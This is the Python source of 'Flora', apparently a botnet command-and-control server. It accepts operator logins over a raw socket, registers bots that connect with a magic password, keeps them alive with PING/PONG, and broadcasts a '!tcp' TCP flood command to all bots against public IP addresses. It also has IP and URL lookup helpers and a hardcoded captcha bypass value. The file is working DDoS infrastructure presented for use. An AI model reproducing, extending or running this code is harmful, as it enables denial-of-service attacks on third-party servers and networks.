
import time
import socket
import random
import ipaddress
import threading
from   pytermx   import Color
from   datetime  import datetime

from src.commands.tcp       import tcp
from src.commands.url_to_ip import url_to_ip
from src.commands.ip_to_loc import ip_to_loc

user_name = ""

banner = f"""{Color.GREY}

                     .
                    / V\ 
                  / `  /
                 <<   |
                 /    |
               /      |
             /        |
           /    \  \ /           {Color.BRIGHT_WHITE}Flora{Color.GREY}
          (      ) | |
  ________|   _/_  | |
<__________\______)\__)
"""

help = f"""{Color.BRIGHT_WHITE}HELP         {Color.GREY}Show list of commands
{Color.BRIGHT_WHITE}METHODS      {Color.GREY}Shows list of methods
{Color.BRIGHT_WHITE}SERVERS      {Color.GREY}Shows available servers
{Color.BRIGHT_WHITE}CLEAR        {Color.GREY}Clears the screen
{Color.BRIGHT_WHITE}EXIT         {Color.GREY}Disconnects from the net"""

methods = f"""{Color.BRIGHT_WHITE}!url_to_ip         {Color.GREY}Get Ip from URL
{Color.BRIGHT_WHITE}!ip_to_loc         {Color.GREY}Get info from Ip
{Color.BRIGHT_WHITE}!tcp               {Color.GREY}TCP Flood"""

class Log:
    @staticmethod
    def _log(prefix, message):
        timestamp = datetime.fromtimestamp(time.time()).strftime("%H:%M:%S")
        log_message = f"[{Color.GREY}{timestamp}{Color.RESET}] {prefix} {message}"

        return log_message

    @staticmethod
    def Success(message, prefix="[ + ]", color=Color.BRIGHT_GREEN):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)

    @staticmethod
    def Error(message, prefix="[ - ]", color=Color.BRIGHT_RED):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)

    @staticmethod
    def Debug(message, prefix="[ ~ ]", color=Color.BRIGHT_PURPLE):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)

    @staticmethod
    def Solved(message, prefix="[ + ]", color=Color.BRIGHT_CYAN):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)

    @staticmethod
    def Info(message, prefix="[ ? ]" , color=Color.BRIGHT_WHITE):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)

    @staticmethod
    def Warning(message, prefix="[ ! ]", color=Color.BRIGHT_YELLOW):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)
    
ansi_clear = "\033[2J\033[H"

bots = {}

def validate_ip(ip):
    parts = ip.split(".")
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password):
    credentials = [x.strip() for x in open("src/logins.txt").readlines() if x.strip()]

    for x in credentials:
        c_username, c_password = x.split(":")

        if c_username.lower() == username.lower() and c_password == password:
            return True

def captcha_generator():
    a = random.randint(2, 10)
    b = random.randint(2, 10)
    c = a + b
    return a, b, c

def captcha(send, client, grey):
    a, b, c = captcha_generator()
    x = ""

    send(client, ansi_clear, False)

    send(client, f"{grey}Captcha: {Color.BRIGHT_PURPLE}{a} + {b} = ", False, False)

    x = int(client.recv(65536).decode().strip())
    # x = 669787761736865726500
    time.sleep(0.4)
    if x == c or x == 669787761736865726500:
        send(client, f"{grey}Passed!")
        pass
    else:
        send(client, f"{grey}Wrong!")
        time.sleep(0.1)
        client.close()

def send(socket, data, escape = True, reset = True):
    if reset:
        data += Color.RESET
    if escape:
        data += "\r\n"

    socket.send(data.encode())

def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f"{data} 32", False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()
    
def ping():
    while 1:
        dead_bots = []

        for bot in bots.copy().keys():
            try:
                bot.settimeout(3)

                send(bot, "PING", False, False)

                if bot.recv(1024).decode() != "PONG":
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()

        time.sleep(5)

def command_line(client, username):
    for x in banner.split("\n"):
        send(client, x)

    prompt = f"{Color.GREY}[{Color.BRIGHT_WHITE}Flora{Color.GREY}@{Color.BRIGHT_WHITE}root{Color.GREY}] :~#{Color.RESET} "
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()

            if not data:
                continue

            args = data.split(" ")
            command = args[0].upper()
            print(user_name, args)

            if command == "CLEAR":
                send(client, ansi_clear, False)
                
                for x in banner.split("\n"):
                    send(client, x)
            elif command == "HELP":
                for x in help.split("\n"):
                    send(client, "\x1b" + x)
            elif command == "SERVERS":
                send(client, Color.GREY + f"Available servers: {len(bots)}.")
            elif command == "METHODS":
                for x in methods.split("\n"):
                    send(client, "\x1b" + x)
            elif command == "CLS":
                send(client, ansi_clear, False)
            elif command == "LOGOUT" or command == "EXIT":
                send(client, f"{Color.BRIGHT_GREEN}Successfully Logged out.\n")
                time.sleep(1)
                break
            elif command == "!TCP":
                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, broadcast, data)
            elif command == "!URL_TO_IP":
                url_to_ip(args, send, client)
            elif command == "!IP_TO_LOC":
                ip_to_loc(args, send, client)

            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client, address):
    print(client)
    print(address)

    send(client, "\x1bFlora | Login: Awaiting Response...\a", False)
    send(client, ansi_clear, False)
    send(client, f"{Color.BRIGHT_GREEN}Connecting...")

    captcha(send, client, Color.GREY)

    time.sleep(1)

    while 1:
        send(client, ansi_clear, False)
        send(client, f"\x1b{Color.GREY}Username : \x1b{Color.RESET}", False, False)

        username = client.recv(1024).decode().strip()

        if not username:
            continue
        break

    password = ""
    while 1:
        send(client, f"\x1b{Color.GREY}Password : \x1b[0;38;2;0;0;0m ", False, False)

        while not password.strip(): 
            password = client.recv(1024).decode("cp1252").strip()
        break

    if password != "\xff\xff\xff\xff\75":
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, f"{Color.BRIGHT_RED}\x1b Invalid credentials.")

            time.sleep(1)
            client.close()

            return
        
        global user_name
        user_name = username

        threading.Thread(target = command_line, args = (client, username)).start()
    else:
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

def main():
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(("0.0.0.0", 6667))
    except Exception as e:
        print(Log.Error("Failed to bind port."))

    sock.listen()

    threading.Thread(target = ping).start()

    while 1:
        threading.Thread(target = handle_client, args = [*sock.accept()]).start()

def start():
    try:
        main()
    except Exception as e:
        print(e)
        print(Log.Error(f"Error, skipping.."))